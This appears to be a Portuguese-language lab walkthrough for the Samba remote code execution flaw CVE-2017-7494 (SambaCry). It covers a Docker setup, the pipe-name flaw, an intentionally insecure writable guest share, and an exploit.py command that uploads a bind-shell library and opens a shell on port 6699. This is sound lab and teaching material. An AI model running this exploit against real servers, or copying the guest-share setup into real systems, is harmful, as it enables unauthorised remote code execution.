# Samba Authenticated RCE (CVE-2017-7494, Aka SambaCry)

O Samba é o conjunto de programas de interoperabilidade padrão do Windows para Linux e Unix, que fornece serviços de impressão e arquivos seguros, estáveis e rápidos para todos os clientes que usam o protocolo SMB/CIFS.

Samba 3.x após 3.5.0 e 4.x antes de 4.4.14, 4.5.x antes de 4.5.10 e 4.6.x antes de 4.6.4 que é vulnerável a uma vulnerabilidade de execução remota de código chamada **SambaCry**. O CVE-2017–7494 permite que usuários autenticados remotos carreguem uma biblioteca compartilhada para uma pasta compartilhada gravável e executem ataques de execução de código para assumir o controle de servidores que hospedam serviços Samba vulneráveis.

## Configuração do ambiente

Execute os seguintes comandos para iniciar um servidor Samba 4.6.3:

```
docker-compose up -d
```

## Princípio

Referência a [Exploit SambaCry RCE](https://medium.com/@lucideus/sambacry-rce-exploit-lucideus-research-3a3e5bd9e17c):

> Microsoft Remote Procedure Call (RPC) é uma tecnologia poderosa para criar programas cliente/servidor distribuídos. RPC é uma técnica de comunicação entre processos que permite que software cliente e servidor se comuniquem.
>
> O protocolo MSRPC permite conectar-se a um pipe nomeado a partir de um destino remoto. Ao tentar abrir um pipe usando MSRPC no Samba, o servidor verifica a validade do nome do pipe usando a função interna `is_known_pipename()`.
>
> Um servidor RPC externo pode ser configurado usando a variável 'rpc_server' dentro do smb.conf e então ele irá lidar com a requisição do pipe.
>
> A função `is_known_pipename()` não verifica se o pipe é válido, isso permite usar '/' para inserir um caminho completo de uma biblioteca arbitrária.

Os requisitos de exploração:

- Um servidor gravável anônimo ou uma conta Samba autenticada
- Um caminho conhecido do diretório de compartilhamento gravável

Veja também:

- https://medium.com/@lucideus/sambacry-rce-exploit-lucideus-research-3a3e5bd9e17c
- https://github.com/opsxcq/exploit-CVE-2017-7494
- http://bobao.360.cn/learning/detail/3900.html

## Explorando

Configuração do Samba (você pode encontrar [aqui](smb.conf)) do nosso servidor de destino:

```
[global]
    map to guest = Bad User
    server string = Samba Server Version %v
    guest account = nobody

[myshare]
    path = /home/share
    read only = no
    guest ok = yes
    guest only = yes
```

Use `smbclient` para testar a conexão:

```
smbclient //your-ip/myshare -N
```

![](02.png)

Se você tiver um erro de conexão, verifique sua rede, especialmente a porta 445.

Usando <https://github.com/opsxcq/exploit-CVE-2017-7494> para explorar o servidor:

```
./exploit.py -t your-ip -e libbindshell-samba.so -s myshare -r /home/share/libbindshell-samba.so -u guest -p guest -P 6699
```

Comandos de execução bem-sucedidos:

![](01.png)

Observe que o `exploit/linux/samba/is_known_pipename` do metasploit foi testado com falha desde a versão XX (não sei) e tenho certeza de que funciona em junho de 2017.
